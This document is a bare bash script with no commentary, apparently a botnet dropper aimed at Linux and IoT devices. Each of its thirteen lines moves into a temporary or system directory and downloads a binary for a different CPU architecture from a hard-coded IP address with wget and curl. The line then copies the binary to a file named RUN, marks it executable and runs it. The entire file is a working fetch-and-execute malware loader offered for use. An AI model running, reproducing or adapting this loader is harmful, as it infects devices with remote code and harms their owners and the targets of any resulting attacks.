#!/bin/bash
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/x86; curl -O http://139.162.63.250/x86;cat x86 >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/mips; curl -O http://139.162.63.250/mips;cat mips >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/arc; curl -O http://139.162.63.250/arc;cat arc >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/x86_64; curl -O http://139.162.63.250/x86_64;cat x86_64 >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/mpsl; curl -O http://139.162.63.250/mpsl;cat mpsl >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/arm; curl -O http://139.162.63.250/arm;cat arm >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/arm5; curl -O http://139.162.63.250/arm5;cat arm5 >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/arm6; curl -O http://139.162.63.250/arm6;cat arm6 >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/arm7; curl -O http://139.162.63.250/arm7;cat arm7 >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/ppc; curl -O http://139.162.63.250/ppc;cat ppc >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/spc; curl -O http://139.162.63.250/spc;cat spc >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/m68k; curl -O http://139.162.63.250/m68k;cat m68k >RUN;chmod +x *;./RUN
cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.162.63.250/sh4; curl -O http://139.162.63.250/sh4;cat sh4 >RUN;chmod +x *;./RUN
